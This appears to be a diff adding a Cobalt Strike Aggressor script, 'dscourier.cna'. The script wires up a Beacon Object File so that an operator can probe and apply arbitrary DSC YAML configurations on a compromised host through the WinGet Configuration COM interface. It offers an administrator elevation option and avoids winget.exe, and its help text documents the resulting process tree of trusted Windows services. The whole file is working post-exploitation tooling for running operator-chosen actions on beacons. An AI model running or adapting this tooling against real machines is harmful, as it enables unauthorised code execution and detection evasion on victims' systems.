@@ -1,0 +1,120 @@
+#
+# dscourier.cna — Aggressor script for the DSCourier BOF (CS 4.12+)
+#
+# Commands:
+#   dscourier-check  [-elevated] [-v]
+#   dscourier-apply  <path.yaml> [-elevated] [-v]
+#   dscourier-apply-b64 <base64>  [-elevated] [-v]
+#
+# Flags:
+#   -elevated : use the Elevation:Administrator!new:{CLSID} moniker
+#               (beacon token must already be admin; otherwise E_ACCESSDENIED)
+#   -v        : verbose output (per-unit progress, COM binding trace)
+#
+# Default behaviour: standard (non-elevated) CoCreateInstance, quiet output
+# (only final success / failure line is shown).
+#
+
+sub _dsc_bof {
+    local('$path $arch');
+    $arch = barch($1);
+    $path = script_resource("dscourier. $+ $arch $+ .o");
+    if (!-exists $path) { berror($1, "dscourier: missing $path"); return $null; }
+    return $path;
+}
+
+sub _dsc_read {
+    local('$h $d');
+    $h = openf($1);
+    if ($h is $null) { return $null; }
+    $d = readb($h, -1);
+    closef($h);
+    return $d;
+}
+
+sub _dsc_flags {
+    local('@rest $flags $a');
+    $flags = 0;
+    @rest  = @();
+    foreach $a ($1) {
+        if      ($a eq "-elevated" || $a eq "-e") { $flags = $flags | 0x1; }
+        else if ($a eq "-verbose"  || $a eq "-v") { $flags = $flags | 0x2; }
+        else { push(@rest, $a); }
+    }
+    return %(flags => $flags, rest => @rest);
+}
+
+sub _dsc_run {
+    local('$bid $mode $yaml @argv $bof $bytes $args $info');
+    ($bid, $mode, $yaml, @argv) = @_;
+
+    $bof = _dsc_bof($bid);
+    if ($bof is $null) { return; }
+    $bytes = _dsc_read($bof);
+    if ($bytes is $null) { berror($bid, "dscourier: read failed: $bof"); return; }
+
+    $info = _dsc_flags(@argv);
+    # bof_pack "iib": int mode, int flags, bin yaml
+    $args = bof_pack($bid, "iib", $mode, $info["flags"], $yaml);
+
+    btask($bid, "DSCourier BOF: " . iff($mode == 1, "check", "apply") .
+                iff(($info["flags"] & 0x1), " (elevated)", "") .
+                iff($mode == 0, " [" . strlen($yaml) . "B YAML]", ""));
+
+    beacon_inline_execute($bid, $bytes, "go", $args);
+}
+
+alias dscourier-check {
+    _dsc_run($1, 1, "", sublist(@_, 1));
+}
+
+alias dscourier-apply {
+    local('$path $yaml');
+    if (size(@_) < 2) {
+        berror($1, "usage: dscourier-apply <path.yaml> [-elevated] [-v]");
+        return;
+    }
+    $path = $2;
+    if (!-exists $path) { berror($1, "dscourier-apply: $path not found"); return; }
+    $yaml = _dsc_read($path);
+    if ($yaml is $null || strlen($yaml) == 0) {
+        berror($1, "dscourier-apply: empty or unreadable: $path");
+        return;
+    }
+    _dsc_run($1, 0, $yaml, sublist(@_, 2));
+}
+
+alias dscourier-apply-b64 {
+    local('$yaml');
+    if (size(@_) < 2) {
+        berror($1, "usage: dscourier-apply-b64 <base64> [-elevated] [-v]");
+        return;
+    }
+    $yaml = base64_decode($2);
+    if ($yaml is $null || strlen($yaml) == 0) {
+        berror($1, "dscourier-apply-b64: decode produced no bytes");
+        return;
+    }
+    _dsc_run($1, 0, $yaml, sublist(@_, 2));
+}
+
+beacon_command_register(
+    "dscourier-check",
+    "probe WinGet Configuration COM surface (no ApplySet)",
+    "Usage: dscourier-check [-elevated] [-v]\n\n" .
+    "Binds ConfigurationStaticFunctions, creates the pwsh processor factory,\n" .
+    "and creates a processor. Nothing is applied.");
+
+beacon_command_register(
+    "dscourier-apply",
+    "apply a DSC YAML via WinGet Configuration COM",
+    "Usage: dscourier-apply <path.yaml> [-elevated] [-v]\n\n" .
+    "Reads YAML from the teamserver operator filesystem, ships the bytes to\n" .
+    "the beacon, invokes IConfigurationProcessor::ApplySet. No winget.exe.\n" .
+    "Process tree: svchost!DCOMLaunch -> WindowsPackageManagerServer.exe\n" .
+    "                                 -> ConfigurationRemotingServer.exe");
+
+beacon_command_register(
+    "dscourier-apply-b64",
+    "apply a DSC YAML (base64-encoded on command line)",
+    "Usage: dscourier-apply-b64 <base64> [-elevated] [-v]");
